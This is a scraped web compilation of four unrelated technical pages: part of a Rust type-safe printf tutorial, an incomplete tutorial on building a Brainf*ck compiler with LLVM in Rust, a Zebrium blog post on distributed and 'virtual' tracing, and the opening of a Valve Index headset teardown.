  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>_</span><span>args</span><span>:</span> <span>HNil</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>""</span><span>.to_string</span><span>()</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This impl says that when we reach the end of a format list, just return the empty string. And the only argument we will accept is an empty argument list. Combined with the next impls, this inductively ensures that extra arguments are not accepted.</p>

<p>Next, we will implement <code>FString</code>. This implementation should use the string constant contained in the <code>FString</code> struct, and combine it recursively with the rest of the format list. We don’t use variadic arguments for <code>FString</code>, so they get passed along. In Rust, this English specification becomes:</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>ArgList</span><span>,</span> <span>FmtList</span><span>&gt;</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span>
<span>for</span> <span>HCons</span><span>&lt;</span><span>FString</span><span>,</span> <span>FmtList</span><span>&gt;</span>
<span>where</span> <span>FmtList</span><span>:</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span>
<span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>ArgList</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>self</span><span>.head</span><span>.</span><span>0</span><span>.to_owned</span><span>()</span> <span>+</span> <span>&amp;</span><span>self</span><span>.tail</span><span>.format</span><span>(</span><span>args</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Note that we have to add <code>FmtList: Format&lt;ArgList&gt;</code> to ensure the recursive call to <code>self.tail.format</code> works. Also note that we aren’t implementing <code>Format</code> directly on <code>FString</code>, but rather on an H-list containing <code>FString</code>.</p>

<p>Finally, the most complex case, <code>FVar</code>. We want this impl to take an argument from the <code>ArgList</code>, then format the remaining format list with the remaining arguments.</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>,</span> <span>FmtList</span><span>&gt;</span> <span>Format</span><span>&lt;</span><span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;&gt;</span>
<span>for</span> <span>HCons</span><span>&lt;</span><span>FVar</span><span>,</span> <span>FmtList</span><span>&gt;</span>
<span>where</span>
  <span>FmtList</span><span>:</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span><span>,</span>
  <span>T</span><span>:</span> <span>ToString</span><span>,</span>
<span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>args</span><span>.head</span><span>.to_string</span><span>()</span> <span>+</span> <span>&amp;</span><span>self</span><span>.tail</span><span>.format</span><span>(</span><span>args</span><span>.tail</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Be careful to observe which H-list is being accessed by <code>head</code> and <code>tail</code>. Here, the <code>args</code> H-list provides the data to fill the hole via <code>args.head</code>.</p>

<h2 id="checking-our-properties">Checking our properties</h2>

<p>With this implementation, our correct example successfully compiles and runs:</p>

<div><div><pre><code><span>let</span> <span>example</span> <span>=</span> <span>hlist!</span><span>[</span>
  <span>FString</span><span>(</span><span>"Hello "</span><span>),</span> <span>FVar</span><span>,</span> <span>FString</span><span>(</span><span>"! The first prime is "</span><span>),</span> <span>FVar</span>
<span>];</span>
<span>assert_eq!</span><span>(</span>
  <span>example</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"world"</span><span>,</span> <span>2</span><span>]),</span>
  <span>"Hello world! The first prime is 2"</span>
<span>);</span>
</code></pre></div></div>

<p>What about our incorrect example? If we write this:</p>

<div><div><pre><code><span>example</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"just one arg"</span><span>]);</span>
</code></pre></div></div>

<p>This code fails to compile with the error:</p>

<div><div><pre><code>error[E0308]: mismatched types
  --&gt; src/printf.rs:48:18
   |
48 |   example.format(hlist!["just one arg"]);
   |                  ^^^^^^^^^^^^^^^^^^^^^^
   |                  expected struct `Cons`, found struct `HNil`
   |
   = note: expected struct `HCons&lt;_, HNil&gt;`
              found struct `HNil`
</code></pre></div></div>

<p>While the error is enigmatic, our mistake is at least correctly caught at compile-time. This is because Rust deduces that <code>example.format()</code> expects an H-list of the shape <code>HCons&lt;_, HCons&lt;_, HNil&gt;&gt;</code>, but it finds <code>HNil</code> too soon in our 1-element H-list. A similar error occurs when providing too many args.</p>

<p>Stupendous! We have successfully implemented a type-safe printf using H-lists and traits.</p>

<h2 id="extending-our-abstraction">Extending our abstraction</h2>

<p>Right now, our <code>Format</code> function just checks that the format list and argument list are the same length. We could extend our format structures, for example to ensure that an <code>FVar</code> must be a particular type, or must use <code>Debug</code> vs. <code>Display</code>. Here’s the sketch of such a strategy:</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>PhantomData</span><span>;</span>

<span>// Add flags for whether using Display or Debug</span>
<span>pub</span> <span>struct</span> <span>FDisplay</span><span>;</span>
<span>pub</span> <span>struct</span> <span>FDebug</span><span>;</span>

<span>// Use a type parameter with PhantomData to represent the intended type</span>
<span>pub</span> <span>struct</span> <span>FVar</span><span>&lt;</span><span>T</span><span>,</span> <span>Flag</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>&lt;</span><span>(</span><span>T</span><span>,</span> <span>Flag</span><span>)</span><span>&gt;</span><span>);</span>

<span>// Now, T has to be the same between the format list and arg list</span>
<span>// Also, FDisplay flag requires that `T: Display`</span>
<span>impl</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>,</span> <span>FmtList</span><span>&gt;</span> <span>Format</span><span>&lt;</span><span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;&gt;</span>
<span>for</span> <span>HCons</span><span>&lt;</span><span>FVar</span><span>&lt;</span><span>T</span><span>,</span> <span>FDisplay</span><span>&gt;</span><span>,</span> <span>FmtList</span><span>&gt;</span>
<span>where</span>
  <span>FmtList</span><span>:</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span><span>,</span>
  <span>T</span><span>:</span> <span>Display</span><span>,</span>
<span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>HCons</span><span>&lt;</span><span>T</span><span>,</span> <span>ArgList</span><span>&gt;</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
    <span>// using format! is cheating, but you get the idea</span>
    <span>format!</span><span>(</span><span>"{}"</span><span>,</span> <span>args</span><span>)</span> <span>+</span> <span>&amp;</span><span>self</span><span>.tail</span><span>.format</span><span>(</span><span>args</span><span>.tail</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>// Similar impl for `T: Debug` when `FDebug` is used</span>
</code></pre></div></div>

<p>With this approach, if our format list and arg list differ in type:</p>

<div><div><pre><code><span>let</span> <span>fmt</span> <span>=</span> <span>hlist!</span><span>[</span><span>FString</span><span>(</span><span>"n: "</span><span>),</span> <span>FVar</span><span>::</span><span>&lt;</span><span>i32</span><span>,</span> <span>FDisplay</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>)];</span>
<span>fmt</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"not a number"</span><span>]);</span>
</code></pre></div></div>

<p>Then the code will not compile with the error, <code>&amp;'static str is not i32</code>.</p>

    <p><a href="https://llvm.org/">LLVM</a> is a collection of compiler toolchain technologies  used to compile dynamic and static programming languages. Itâ€™s heavly used in programming languages, such as <a href="https://clang.llvm.org/">Clang</a>, <a href="https://emscripten.org/">Emscripten</a>, and <a href="https://www.rust-lang.org/">Rust</a>!</p>

<p>This tutorial is going to go over how to create a simple compiler using LLVM for <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainf*ck</a> in Rust. The completed code can be found here: <a href="https://github.com/benkonz/brainfrick-rust">brainfrick-rust</a></p>



<p><a href="https://en.wikipedia.org/wiki/Brainfuck">Brainf-ck</a> is a very simple, turing complete, programming language that is made up of 8 commands. Each command is a single character, so parsing out an entire brainf*ck file is easy. Just read every character and match the character with a command. If the character isnâ€™t a command, just skip it and move to the next character.</p>

<h2 id="commands">Commands</h2>

      <td>accept one byte of input from <code>stdin</code>, storing itâ€™s value in the byte at the data pointer</td>
    </tr>
    <tr>
      <td><code>[</code></td>
      <td>if the byte at the data pointer is zero, then move the program counter to instruction after the matching <code>]</code>, otherwise move to the next instruction</td>
    </tr>
    <tr>
      <td><code>]</code></td>
      <td>if the byte at the data pointer is nonzero, then move the program counter to the instruction after the matching <code>[</code>, otherwise move to the next instruction</td>
    </tr>
  </tbody>
</table>

<h2 id="sample-program">Sample Program</h2>

<p>This simple program is going to add the current cellâ€™s value to the next cell</p>



<p>Think of <code>[</code> and <code>]</code> as <code>while (*data_ptr) {</code> and <code>}</code>, respectivly.
We decrement the current cellâ€™s value with <code>-</code>, then increment the <code>data_ptr</code> with <code>&gt;</code>, then increment the new value at our data pointer with <code>+</code>, then decrement the <code>data_ptr</code> back to where it was at the start of the loop with <code>-</code>.</p>

<p>Since this is surrounded in a <code>[</code> <code>]</code>, we are going to do this until the value at the <code>data_ptr</code> is <code>0</code>, effectivly adding the value at the <code>data_ptr</code> to the next value in memory.</p>



<p>This project uses <a href="https://releases.llvm.org/10.0.0/docs/ReleaseNotes.html">LLVM-10</a>, as well as <a href="https://crates.io/">Cargo</a>.</p>

<p>Start with:</p>

<div><div><pre><code>cargo new --bin brainfrick-rust
</code></pre></div></div>

<p>then edit the <code>Cargo.toml</code> file and add this to the dependencies:</p>

<div><div><pre><code><span>inkwell</span> <span>=</span> <span>{</span> <span>git</span> <span>=</span> <span>"https://github.com/TheDan64/inkwell"</span><span>,</span> <span>branch</span> <span>=</span> <span>"llvm10-0"</span> <span>}</span>
<span>clap</span> <span>=</span> <span>"2.33"</span>
</code></pre></div></div>

<p><code>clap</code> is used to make parsing command line args easier</p>

<p>Verify that everything works by running:</p>



<p>Unless youâ€™ve already installed the LLVM-10 development files on your machine, you will probably get an error message complaining about being unable to find LLVM-10. If thatâ€™s the case, just follow the â€œCompiling LLVMâ€� instructions <a href="https://crates.io/crates/llvm-sys">here</a>.</p>



<p>Weâ€™re going to start by making a simple executable that just returns <code>0</code>.</p>

<p>To start, weâ€™ll parse out the command line args. The first argument will be our input file and the <code>-o OUTPUT</code> will be our output file.</p>

        <span>)</span>
        <span>.get_matches</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>Next, weâ€™ll create our <code>context</code>, <code>module</code>, and <code>builder</code></p>

<div><div><pre><code><span>use</span> <span>inkwell</span><span>::</span><span>context</span><span>::</span><span>Context</span><span>;</span>

<span>let</span> <span>context</span> <span>=</span> <span>Context</span><span>::</span><span>create</span><span>();</span>
<span>let</span> <span>module</span> <span>=</span> <span>context</span><span>.create_module</span><span>(</span><span>"brainfrick_rust"</span><span>);</span>
<span>let</span> <span>builder</span> <span>=</span> <span>context</span><span>.create_builder</span><span>();</span>
</code></pre></div></div>

<p>After that, weâ€™ll create a main function type, which takes no arguments and returns an <code>i32</code> and add it to our module</p>

<div><div><pre><code><span>use</span> <span>inkwell</span><span>::</span><span>module</span><span>::</span><span>Linkage</span><span>;</span>

<span>let</span> <span>i32_type</span> <span>=</span> <span>context</span><span>.i32_type</span><span>();</span>
<span>let</span> <span>main_fn_type</span> <span>=</span> <span>i32_type</span><span>.fn_type</span><span>(</span><span>&amp;</span><span>[],</span> <span>false</span><span>);</span>
<span>let</span> <span>main_fn</span> <span>=</span> <span>module</span>
                <span>.add_function</span><span>(</span><span>"main"</span><span>,</span> <span>main_fn_type</span><span>,</span> <span>Some</span><span>(</span><span>Linkage</span><span>::</span><span>External</span><span>));</span>
</code></pre></div></div>

<p>Next, weâ€™ll set the builderâ€™s instruction pointer to the main function and use it to build a return instruction</p>

<div><div><pre><code><span>let</span> <span>basic_block</span> <span>=</span> <span>context</span><span>.append_basic_block</span><span>(</span><span>main_fn</span><span>,</span> <span>"entry"</span><span>);</span>
<span>builder</span><span>.position_at_end</span><span>(</span><span>basic_block</span><span>);</span>

<span>// our compiler will go here</span>

<span>let</span> <span>i32_zero</span> <span>=</span> <span>i32_type</span><span>.const_int</span><span>(</span><span>0</span><span>,</span> <span>false</span><span>);</span>
<span>builder</span><span>.build_return</span><span>(</span><span>Some</span><span>(</span><span>&amp;</span><span>i32_zero</span><span>));</span>
</code></pre></div></div>

<p>Finally, weâ€™ll have to setup LLVM to convert the builder to machine code and write that result to a file</p>

<div><div><pre><code><span>use</span> <span>inkwell</span><span>::</span><span>targets</span><span>::{</span>

    <span>.ok_or_else</span><span>(||</span> <span>"Unable to create target machine!"</span><span>.to_string</span><span>())</span><span>?</span><span>;</span>

<span>// use the machine to convert our module to machine code and write the result to a file</span>

</code></pre></div></div>

<p>The <code>FileType::Object</code> can be changed to <code>FileType::Assembly</code> to write human-readable machine instructions, which is very useful for debugging your compiler</p>

<h2 id="running-the-executable">Running the executable</h2>

<p>By setting the file type to <code>FileType::Object</code>, LLVM will produce an <a href="https://en.wikipedia.org/wiki/Object_file">Object File</a>. That file cannot be run by itself, and needs to be linked togeather by a linker. Typically, this is ued by <a href="https://linux.die.net/man/1/ld">ld</a>, but the right arguments to <code>ld</code> varies based on Linux disro. The easier way to link your object file is with <a href="https://gcc.gnu.org/">gcc</a>, which, internally, calls <code>ld</code> with the right args.</p>

<div><div><pre><code>cargo run INPUT_FILE -o OUTPUT_FILE
gcc OUTPUT_FILE -o OUTPUT_FILE.exe
./OUTPUT_FILE.exe
echo $?
0
</code></pre></div></div>

<p>The <code>echo $?</code> should print out the status code of the last program. You can modify the <code>let i32_zero = i32_type.const_int(0, false);</code> line to return any integer.</p>



<p>Before we start compiling our source program, we need to initialize the memory that our brainf*ck programs will use. This means calling the <a href="https://en.cppreference.com/w/c/memory/calloc">calloc</a> libc call.</p>

<p>After weâ€™ve initialized our <code>builder</code>, weâ€™re going to add this code</p>

<div><div><pre><code><span>use</span> <span>inkwell</span><span>::</span><span>AddressSpace</span><span>;</span>

<span>let</span> <span>i64_type</span> <span>=</span> <span>context</span><span>.i64_type</span><span>();</span>
<span>let</span> <span>i8_type</span> <span>=</span> <span>context</span><span>.i8_type</span><span>();</span>
<span>let</span> <span>i8_ptr_type</span> <span>=</span> <span>i8_type</span><span>.ptr_type</span><span>(</span><span>AddressSpace</span><span>::</span><span>Generic</span><span>);</span>

<span>let</span> <span>calloc_fn_type</span> <span>=</span> <span>i8_ptr_type</span><span>.fn_type</span><span>(</span><span>&amp;</span><span>[</span><span>i64_type</span><span>.into</span><span>(),</span> <span>i64_type</span><span>.into</span><span>()],</span> <span>false</span><span>);</span>
<span>let</span> <span>calloc_fn</span> <span>=</span> <span>module</span>
    <span>.add_function</span><span>(</span><span>"calloc"</span><span>,</span> <span>calloc_fn_type</span><span>,</span> <span>Some</span><span>(</span><span>Linkage</span><span>::</span><span>External</span><span>));</span>

</code></pre></div></div>

<p>Weâ€™re also going to want to add the <code>getchar</code> and <code>putchar</code> functions, which are going to get used by the <code>.</code> and  <code>,</code> commands.</p>

<div><div><pre><code><span>let</span> <span>getchar_fn_type</span> <span>=</span> <span>i32_type</span><span>.fn_type</span><span>(</span><span>&amp;</span><span>[],</span> <span>false</span><span>);</span>
<span>let</span> <span>getchar_fn</span> <span>=</span><span>module</span>
    <span>.add_function</span><span>(</span><span>"getchar"</span><span>,</span> <span>getchar_fn_type</span><span>,</span> <span>Some</span><span>(</span><span>Linkage</span><span>::</span><span>External</span><span>));</span>

<span>let</span> <span>putchar_fn_type</span> <span>=</span> <span>i32_type</span><span>.fn_type</span><span>(</span><span>&amp;</span><span>[</span><span>i32_type</span><span>.into</span><span>()],</span> <span>false</span><span>);</span>
<span>let</span> <span>putchar_fn</span> <span>=</span><span>module</span>
    <span>.add_function</span><span>(</span><span>"putchar"</span><span>,</span> <span>putchar_fn_type</span><span>,</span> <span>Some</span><span>(</span><span>Linkage</span><span>::</span><span>External</span><span>));</span>
</code></pre></div></div>

<p>Next, weâ€™re going to call <code>calloc</code> and initialize our <code>data</code> and <code>ptr</code> variables, which will both point to the result of our <code>calloc</code> call. After the <code>builder.position_at_end(basic_block);</code> line, weâ€™re going to add this code:</p>

<div><div><pre><code><span>let</span> <span>i8_type</span> <span>=</span> <span>context</span><span>.i8_type</span><span>();</span>
<span>let</span> <span>i8_ptr_type</span> <span>=</span> <span>i8_type</span><span>.ptr_type</span><span>(</span><span>AddressSpace</span><span>::</span><span>Generic</span><span>);</span>

<span>let</span> <span>data</span> <span>=</span> <span>builder</span><span>.build_alloca</span><span>(</span><span>i8_ptr_type</span><span>,</span> <span>"data"</span><span>);</span>
<span>let</span> <span>ptr</span> <span>=</span> <span>builder</span><span>.build_alloca</span><span>(</span><span>i8_ptr_type</span><span>,</span> <span>"ptr"</span><span>);</span>

<span>let</span> <span>i64_type</span> <span>=</span> <span>context</span><span>.i64_type</span><span>();</span>
<span>let</span> <span>i64_memory_size</span> <span>=</span> <span>i64_type</span><span>.const_int</span><span>(</span><span>30_000</span><span>,</span> <span>false</span><span>);</span>
<span>let</span> <span>i64_element_size</span> <span>=</span> <span>i64_type</span><span>.const_int</span><span>(</span><span>1</span><span>,</span> <span>false</span><span>);</span>

<span>let</span> <span>data_ptr</span> <span>=</span> <span>builder</span><span>.build_call</span><span>(</span>
    <span>calloc_fn</span><span>,</span>
    <span>&amp;</span><span>[</span><span>i64_memory_size</span><span>.into</span><span>(),</span> <span>i64_element_size</span><span>.into</span><span>()],</span>
    <span>"calloc_call"</span><span>,</span>
<span>);</span>
<span>let</span> <span>data_ptr_result</span><span>:</span> <span>Result</span><span>&lt;</span><span>_</span><span>,</span> <span>_</span><span>&gt;</span> <span>=</span> <span>data_ptr</span><span>.try_as_basic_value</span><span>()</span><span>.flip</span><span>()</span><span>.into</span><span>();</span>
<span>let</span> <span>data_ptr_basic_val</span> <span>=</span>
    <span>data_ptr_result</span><span>.map_err</span><span>(|</span><span>_</span><span>|</span> <span>"calloc returned void for some reason!"</span><span>)</span><span>?</span><span>;</span>

<span>builder</span><span>.build_store</span><span>(</span><span>data</span><span>,</span> <span>data_ptr_basic_val</span><span>);</span>
<span>builder</span><span>.build_store</span><span>(</span><span>ptr</span><span>,</span> <span>data_ptr_basic_val</span><span>);</span>
</code></pre></div></div>

<p>Finally, weâ€™re going to call <a href="https://en.cppreference.com/w/c/memory/free">free</a> on our <code>data</code> pointer. This isnâ€™t really necessary, since the program ends right after, but it is good practice. LLVM has a convience function called <code>build_free</code>, so we donâ€™t need to add the free function to our module.</p>

<div><div><pre><code>  <span>builder</span>
    <span>.build_free</span><span>(</span><span>builder</span><span>.build_load</span><span>(</span><span>data</span><span>,</span> <span>"load"</span><span>)</span><span>.into_pointer_value</span><span>());</span>

</code></pre></div></div>

<p>Letâ€™s verify that everything is working correctly. Recompile our code and make another executable with <code>cargo run</code>. Re-link it with <code>gcc</code>, then run <code>ltrace ./OUTPUT_FILE.exe</code>. You should see something like this:</p>

<div><div><pre><code>calloc(30000, 1)        = 0x55a9ec9482a0
free(0x55a9ec9482a0)    = &lt;void&gt;
+++ exited (status 0) +++
</code></pre></div></div>

<p><code>ltrace</code> traces all of the library calls of an executable, so we should see a call to <code>calloc</code> and a call to <code>free</code>.</p>

<p>Weâ€™ll need to setup some boilerplate code to read in our input file and iterate through all of the characters. After <code>builder.build_store(ptr, data_ptr_basic_val);</code>, add</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>fs</span><span>::</span><span>File</span><span>;</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2>The promise of tracing</h2>
<p>Distributed tracing is commonly used in Application Performance Monitoring (APM) to monitor and manage application performance, giving a view into what parts of a transaction call chain are slowest. It is a powerful tool for monitoring call completion times and examining particular requests and transactions.</p>
<!--more--><p>Quite beyond APM, it seems natural to expect tracing to yield a ‘troubleshooting tool to rule them all’. The detail and semantic locality of the trace, coupled with the depth of the service call graph, generate this expectation. It’s obvious that correlating across services gives diagnostic power. The typical traceview screams the sort of “first this, then that” narrative RCAs are made of.</p>

<p>In reality, though, users have seen mixed results. According to a prospect:</p>

<p><em>“We paid six figures for a &lt;well-known tracing tool&gt; contract, to reduce MTTR significantly. We’ve given up on that. We’re writing it off. Engineers had to do extra work to implement it. Operations had to do extra work to set and respond to alerts. The alerts worked well but, in the end, finding root-cause was still slow. It just wasn’t worth it.”</em></p>

<p>This is not isolated feedback.</p>
<h2>“Tell me where to focus”</h2>
<p>There are two issues raised: work required to yield results, and inadequacy of those results. The first issue is easy to understand: depending on the stack, the application, the application’s evolution, the deployment mechanisms and so on, it may indeed be a lot of work to generate useful traces. This problem is not surprising and can be surmounted; it is worth taking away that zero-configuration, zero-instrumentation (i.e., <em>autonomous</em>) solutions are of great value.</p>

<p>The larger issue is around applicability for root-cause detection. Here, respected Observability author and blogger Cindy Sridharan has some insightful things to say. I’ll lift a quote <a href="https://medium.com/@copyconstruct/distributed-tracing-weve-been-doing-it-wrong-39fc92a857df" rel="noopener" target="_blank">from her article</a>&nbsp;which I highly recommend:</p>

<p><em>“What’s ideally required at the time of debugging is a tool that’ll help&nbsp;reduce the search space… Instead of seeing an entire trace, what I really want to be seeing is a&nbsp;portion&nbsp;of the trace where something interesting or unusual is happening… dynamically generated service topology views&nbsp;based on specific attributes like error rate or response time…”</em></p>

<p><em><img src="https://www.zebrium.com/hs-fs/hubfs/Blogs/distributed%20tracing.png?width=900&amp;name=distributed%20tracing.png" alt="distributed tracing" width="900" srcset="https://www.zebrium.com/hs-fs/hubfs/Blogs/distributed%20tracing.png?width=450&amp;name=distributed%20tracing.png 450w, https://www.zebrium.com/hs-fs/hubfs/Blogs/distributed%20tracing.png?width=900&amp;name=distributed%20tracing.png 900w, https://www.zebrium.com/hs-fs/hubfs/Blogs/distributed%20tracing.png?width=1350&amp;name=distributed%20tracing.png 1350w, https://www.zebrium.com/hs-fs/hubfs/Blogs/distributed%20tracing.png?width=1800&amp;name=distributed%20tracing.png 1800w, https://www.zebrium.com/hs-fs/hubfs/Blogs/distributed%20tracing.png?width=2250&amp;name=distributed%20tracing.png 2250w, https://www.zebrium.com/hs-fs/hubfs/Blogs/distributed%20tracing.png?width=2700&amp;name=distributed%20tracing.png 2700w" sizes="(max-width: 900px) 100vw, 900px"></em></p>

<p>We need a tool that takes a stab at incident and, if possible, root-cause detection, or highlighting. Stepping back further, I would posit that trace data has become a bit like log data: a treasure trove of untapped information for root-cause detection, in-part because there is just too much detail to sift through without help.</p>
<h2>Virtual tracing alone</h2>
<p>Tracing is so promising for troubleshooting because of semantic locality. Tracing works the way it does because span ids are passed around the stack - in headers or log lines, for example. These spans are then associated together into a trace, and so we know all the spans in the trace are at least to some extent “about” the same thing - a transaction or request, for example.</p>

<p>There are other ways to establish semantic locality. Looking again at a trace, we might note that its spans demonstrate temporal locality, as well. We might suppose that a majority of service-impacting incidents also have temporal locality: if Service A fails, and Service B calls Service A, then Service B is likely also to fail, soon after Service A does. Our job will be to determine spans of telemetric data that share semantic locality.</p>

<p>Could we suppose that events happening nearby in time are semantically related? Of course not… but, we could look for features in *ordinary telemetry* - “rareness” or “badness”, for example - and model inter-occurrence intervals of such features across services. Rareness might be indicated by rare log events from a given container, for example, or a multi-hour peak in a metric; badness might be indicated by a flurry of errors from another container, or a host log.</p>

<p>Machine learning could observe the ordinary behavior of the system to estimate parameters for our model, and then use the model to hypothesize which features ARE semantically related, with high probability. Related features would in this way correspond to a virtual trace; each virtual span would map directly to a timespan of telemetric data capture for a single generator - host, container, or service, for example.</p>
<h2>A virtual tracing example</h2>
<p>A database server is inadvertently shut down. A number of rare events are emitted into its log stream; a rare spike in available memory occurs on the host(s). A few seconds later, a flurry of unusual errors are emitted in the log stream of a service reliant on the database because it cannot connect to the database.</p>

<p>Say, rare events in the database log stream happen at random about once per day, on average; rare errors in the consumer’s log stream happen about once every hour; comparable spikes in available memory happen twice a day. But now, all three of these rare things happened within 3 seconds.</p>

<p>The ML model decides these all should be part of a virtual trace, as a result; we construct spans of related activity on each generator - contiguous timespans, in fact - and bundle them up. If there was enough badness, we notify; we fingerprint to keep track of separate “trace types”. In this way we’ve achieved the goals of autonomous incident and root-cause detection; we can present only the data and services where attention should be focused.</p>

<h2>Virtual and instrumented tracing combined</h2>
<p>Combining these approaches yields real opportunities for improving the user experience. The instrumented trace augments the virtual one. For example, the service graph can be used to exclude virtual spans from a virtual trace based on implausibility of the related generator causing the observed badness; the full trace can give deep performance context to the virtual trace and serve as a launching-off point to navigate to other services and/or similar traces. Instrumented tracing brings precision, depth, and broad context to a virtual trace.</p>

<p>Similarly, the virtual trace augments the instrumented one. We can hone or auto-tune our alerting based on badness seen in the virtual trace; we can hone the traceview to just those services and components touching the virtual trace, and then allow the user to expand outward, if need be. Virtual tracing brings autonomy, incident detection, and root-cause indication to an instrumented trace.</p>

<p>Zebrium has built an implementation of virtual tracing into its autonomous log management and monitoring platform. <a href="https://www.zebrium.com/" rel=" noopener">You can read more about it here</a>.&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>If you have ever wondered what is inside Valve Index, you might have stumbled upon my <a href="https://www.reddit.com/r/ValveIndex/comments/cpayc5/valve_index_disassembly/">reddit post from 2019</a>. I’ve decided to dive into the details of what makes Valve Index great and share my thoughts on tech inside.</p>

<p>Teardown should begin from the simplest parts - remove the face mask (held by just magnets), unplug the main cable, and remove headphones that are held in place by a single screw each. Next remove the rubber cover that is glued around lenses. It’s not that well glued, you can just pull it off.</p>

<p><img src="https://www.thevrist.com/assets/images/index1.jpg" alt="">
<em>Rubber cover that prevents dust from getting inside lenses</em></p>

<p>Let’s start with a front panel - glossy front panel is removed by hand, since it is only held by magnets (but you already knew that from all the numerous pictures of people shoving stuff in the frunk of the headset). The rest of the front panel can be easily split in two parts. First is the frunk section, it will give you access to the main circuit board of the headset. You can remove it quite painlessly if you have the correct screwdriver. This panel does not contain any electronics.</p>

<p><img src="https://www.thevrist.com/assets/images/index-face.jpg" alt="">
<em>Just look at this beauty</em></p>

<p>Second part of the front panel is more complex. It contains tracking points for the SteamVR tracking - you can see them by looking at the plastic at different angles - plastic covering tracking points is thinner so laser beams from base stations could shoot through it. SteamVR trackers are split in two independent parts, which are connected to the main circuit separately. Also this panel contains two front facing cameras, which makes the process of taking it off even more delicate. You have to disconnect two cameras and two halves of the tracking plate’s system to finally fully reveal the main circuit.</p>

<h2 id="main-circuit">Main Circuit</h2>

<p><img src="https://www.thevrist.com/assets/images/index2.jpg" alt="">
<em>The “meat” of Valve Index</em></p>

<p>Finally we get to the main computing power of the headset. You can identify the main points of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index3-1.png" alt="">
<em>This is where all the cables connect to the HMD</em></p>

<p>On the top there is a metal connector with FPC cable going in. It is going to the smaller circuit in the top part of the headset where the cable plugs in the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index4.jpg" alt="">
<em>Circuit board with main cable and 3.5 mm audio port. It also connects to the proximity sensor</em></p>

<p>Same circuit has a 3.5 mm audio port for connecting headphones (I bet you didn’t know there is an audio jack) and proximity sensor between lenses. Last one is used for turning off the screens when the headset is not on the head.</p>

<p><img src="https://www.thevrist.com/assets/images/index2-1.png" alt="">
<em>SteamVR tracking points are connected here</em></p>

<p>On the sides of the main circuit board there are two black FPC cables. Those are going to the SteamVR tracking dots located in the sides of the headsets. Here is a picture of the tracking “web” when taken out of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index5.jpg" alt="">
<em>One side of SteamVR tracking web taken out of the HMD</em></p>

<p>Final two FPC cables are orange color and located at the bottom of the main board. They are connecting to a pair of displays located right behind this circuit.</p>

<h2 id="microchips">Microchips</h2>

<p>Now it is time to dive in a wonderful world of microchips and circuit boards. I want to thank <a href="https://www.linkedin.com/in/popovs/">Sergejs Popovs</a> for helping to identify most of the components on the board.</p>

<p>Let’s start with simple chips. Here are two bluetooth <a href="https://www.nordicsemi.com/Products/Low-power-short-range-wireless/nRF52840">chips from Nordic Semiconductors</a>. Each of these chips is used for connecting one controller with the headset. That’s why there is a limitation of two devices connected to the HMD. If you want to connect more devices (Vive Trackers or other controllers) you will need to use a USB dongle with a separate Bluetooth chip.</p>

<p><img src="https://www.thevrist.com/assets/images/index6.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index7.jpg" alt="">
<em>Bluetooth microchips, each connects to one device</em></p>

<p>Do you remember the USB port in the frunk? Well, this is a <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/USB5744-Data-Sheet-DS00001855J.pdf">chip from Microchip</a> for that USB port - hence USB in the name.</p>

<p><img src="https://www.thevrist.com/assets/images/index4-4.jpg" alt="">
<em>USB chip for USB port next to it</em></p>

<p>Here is a <a href="https://www.via-labs.com/product_show.php?id=96">chip from Via-Labs</a>. It has a purpose of converting USB 3.1 signal to the 2.0 one. Some of the chips on the circuit are not advanced enough to understand 3.1 USB, so this chip “dumbs it down”. When the signal will need to go back to the PC, the chip will convert the signal back to the USB 3.1.</p>

<p>This is a flash memory chip from <a href="https://www.digikey.com/products/en/integrated-circuits-ics/memory/774?k=w25q32jw">Winbond Electronics</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index9.jpg" alt="">
<em>Flash memory can be used for different kinds of tasks</em></p>

